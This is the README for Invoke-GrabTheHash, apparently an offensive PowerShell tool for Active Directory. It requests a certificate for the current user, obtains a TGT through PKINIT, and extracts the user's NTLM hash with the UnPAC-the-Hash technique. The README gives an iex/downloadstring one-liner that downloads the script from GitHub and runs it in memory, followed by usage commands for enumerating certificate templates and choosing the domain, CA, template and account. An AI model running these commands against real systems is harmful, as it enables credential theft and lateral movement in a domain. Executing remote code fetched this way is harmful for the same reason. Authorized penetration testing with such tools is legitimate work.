# Invoke-GrabTheHash
Requests a certificate from a Windows Certificate Authority (CA) for the Current Session User's TGT, uses PKINIT to obtain a TGT for the same user, then performs the UnPAC-the-Hash technique to extract the user's NTLM hash

### Run as follows
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-GrabTheHash/main/Invoke-GrabTheHash.ps1')
```
```
Invoke-GrabTheHash
```

### Specify a target Domain
```
Invoke-GrabTheHash -Domain <domain.name>
```

### Enumerate for Certificate Templates
```
Invoke-GrabTheHash -CertTemplates
```

### Specify a Certificate Template to use
By default, the "User" template is used to request a certificate
```
Invoke-GrabTheHash -TemplateName <template_name>
```

### Specify the CA Name
```
Invoke-GrabTheHash -CAName "CA01.domain.local\domain-CA01-CA"
```

### Specify the User Account Name
This must correspond to the TGT Account Name in your current session
```
Invoke-GrabTheHash -CN <samaccountname>
```

### Example Output
![image](https://github.com/Leo4j/Invoke-GrabTheHash/assets/61951374/fcb77053-ebf9-4132-bbaf-8a576a6d08b1)
